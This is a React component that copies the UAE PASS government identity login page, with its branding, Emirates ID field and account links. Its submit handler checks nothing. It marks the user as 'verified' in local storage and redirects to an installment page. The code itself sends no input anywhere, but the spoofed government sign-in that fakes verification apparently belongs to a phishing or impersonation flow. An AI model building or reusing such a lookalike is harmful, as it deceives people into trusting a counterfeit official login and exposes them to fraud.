import React, { useState } from "react";
import { useLocation } from "wouter";

export default function UaePassLogin() {
  const [, setLocation] = useLocation();
  const [rememberMe, setRememberMe] = useState(false);
  const [inputValue, setInputValue] = useState("");

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    localStorage.setItem("uaePassVerified", "true");
    setLocation("/installment-en");
  };

  return (
    <div style={{ minHeight: "100vh", backgroundColor: "#ffffff", display: "flex", flexDirection: "column" }}>
      {/* Green Top Bar */}
      <div style={{ height: "8px", backgroundColor: "#00a86b", width: "100%" }}></div>

      {/* Main Content */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center", padding: "40px 20px", backgroundColor: "#f5f5f5" }}>
        <div style={{ maxWidth: "600px", width: "100%" }}>
          {/* Fingerprint Icon - SVG */}
          <div style={{ textAlign: "center", marginBottom: "40px" }}>
            <svg width="120" height="120" viewBox="0 0 120 120" style={{ margin: "0 auto", animation: "spin 2s linear infinite" }}>
              <defs>
                <style>{`
                  @keyframes spin {
                    from { transform: rotate(0deg); }
                    to { transform: rotate(360deg); }
                  }
                  svg { transform-origin: center; }
                `}</style>
              </defs>
              
              {/* Outer dashed circle - Black */}
              <circle cx="60" cy="60" r="55" fill="none" stroke="#000000" strokeWidth="2" strokeDasharray="4,4" opacity="0.4" />
              
              {/* Outer dots - Black */}
              <circle cx="60" cy="10" r="2" fill="#000000" />
              <circle cx="95" cy="25" r="2" fill="#000000" />
              <circle cx="110" cy="60" r="2" fill="#000000" />
              <circle cx="95" cy="95" r="2" fill="#000000" />
              <circle cx="60" cy="110" r="2" fill="#000000" />
              <circle cx="25" cy="95" r="2" fill="#000000" />
              <circle cx="10" cy="60" r="2" fill="#000000" />
              <circle cx="25" cy="25" r="2" fill="#000000" />
              
              {/* Middle circle - Green */}
              <circle cx="60" cy="60" r="45" fill="none" stroke="#00a86b" strokeWidth="2.5" opacity="0.8" />
              
              {/* Inner circle - Green */}
              <circle cx="60" cy="60" r="35" fill="none" stroke="#00a86b" strokeWidth="2" opacity="0.6" />
              
              {/* Fingerprint spiral - Black outer curves */}
              <path d="M 60 25 Q 80 30 85 50 Q 88 70 75 85 Q 60 92 45 85 Q 32 70 35 50 Q 40 30 60 25" fill="none" stroke="#000000" strokeWidth="2" />
              <path d="M 60 35 Q 75 39 80 55 Q 82 68 72 80 Q 60 86 48 80 Q 40 68 42 55 Q 47 39 60 35" fill="none" stroke="#000000" strokeWidth="1.5" />
              
              {/* Fingerprint spiral - Green inner curves */}
              <path d="M 60 45 Q 72 48 76 60 Q 78 70 68 78 Q 60 82 52 78 Q 45 70 47 60 Q 51 48 60 45" fill="none" stroke="#00a86b" strokeWidth="2" />
              <path d="M 60 52 Q 68 54 71 62 Q 72 68 65 75 Q 60 78 55 75 Q 50 68 51 62 Q 54 54 60 52" fill="none" stroke="#00a86b" strokeWidth="1.5" />
              
              {/* Red accent dot */}
              <circle cx="85" cy="45" r="3" fill="#ff0000" />
            </svg>
          </div>

          {/* Title */}
          <h1 style={{ textAlign: "center", fontSize: "32px", fontWeight: "600", color: "#333333", marginBottom: "30px", margin: "0 0 30px 0" }}>
            Login to UAE PASS
          </h1>

          {/* Form */}
          <form onSubmit={handleLogin} style={{ backgroundColor: "#ffffff", borderRadius: "8px", padding: "30px" }}>
            {/* Input Field */}
            <div style={{ marginBottom: "20px" }}>
              <input
                type="text"
                placeholder="Emirates ID, email, or phone eg. 971500000000"
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                style={{
                  width: "100%",
                  padding: "16px",
                  border: "1px solid #cccccc",
                  borderRadius: "8px",
                  fontSize: "16px",
                  boxSizing: "border-box",
                  fontFamily: "Arial, sans-serif",
                }}
              />
            </div>

            {/* Remember Me Checkbox */}
            <div style={{ marginBottom: "25px", display: "flex", alignItems: "center" }}>
              <input
                type="checkbox"
                id="rememberMe"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                style={{
                  width: "20px",
                  height: "20px",
                  cursor: "pointer",
                  accentColor: "#0052cc",
                  marginRight: "10px",
                }}
              />
              <label htmlFor="rememberMe" style={{ fontSize: "16px", color: "#333333", cursor: "pointer", fontWeight: "500" }}>
                Remember me
              </label>
            </div>

            {/* Login Button */}
            <button
              type="submit"
              style={{
                width: "100%",
                padding: "16px",
                backgroundColor: "#5b6b8f",
                color: "#ffffff",
                border: "none",
                borderRadius: "8px",
                fontSize: "18px",
                fontWeight: "600",
                cursor: "pointer",
                marginBottom: "20px",
              }}
            >
              Login
            </button>

            {/* Links */}
            <div style={{ textAlign: "center", fontSize: "14px" }}>
              <span style={{ color: "#666666" }}>Don't have UAEPASS account? </span>
              <a href="#" style={{ color: "#00a86b", textDecoration: "none", fontWeight: "600" }}>
                Create new account
              </a>
            </div>

            <div style={{ textAlign: "center", marginTop: "15px" }}>
              <a href="#" style={{ color: "#00a86b", textDecoration: "none", fontWeight: "600", fontSize: "14px" }}>
                Recover your account
              </a>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
